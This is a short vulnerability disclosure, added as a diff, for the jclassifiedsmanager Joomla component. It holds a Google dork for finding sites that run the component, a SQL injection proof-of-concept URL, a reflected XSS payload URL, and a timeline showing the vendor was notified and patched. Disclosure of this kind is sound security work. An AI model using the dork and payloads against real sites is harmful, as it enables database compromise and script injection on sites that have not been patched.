@@ -1,0 +1,30 @@
+# Exploit Title: jclassifiedsmanager Multiple Vulnerabilities
+# Google Dork: inurl:com_jclassifiedsmanager
+# Date: 26 Jan 2015
+# Exploit Author: Sarath Nair aka AceNeon13 
+# Contact: @AceNeon13
+# Greetings: HariKrishnan, Raj3sh.tv, Deepu.tv
+# Vendor Homepage: cmsjunkie.com
+# Software Link: http://www.cmsjunkie.com/classifieds-manager
+
+
+# PoC Exploit: SQL Injection
+-------------------------------- 
+http://localhost/jclassifiedsmanager/classifieds/offerring-ads?controller=displayads&view=displayads&task=viewad&id=[SQL Injection Here]
+"id" parameter is not sanitized.
+
+# PoC Exploit: XSS Reflected
+--------------------------------
+http://localhost/jclassifiedsmanager/classifieds?view=displayads7ed3b"onload%3d"alert(1)"87d4d&layout=offerring&controller=displayads&adtype=1
+"view" parameter is not sanitized.
+
+########################################
+# Vulnerability Disclosure Timeline:
+ 
+2014-Dec-11:  Discovered vulnerability
+2014-Dec-12:  Vendor Notification
+2014-Dec-12:  Vendor Response/Feedback
+2015-Jan-19:  Vendor Fix/Patch
+2015-Jan-26:  Public Disclosure
+#######################################
+
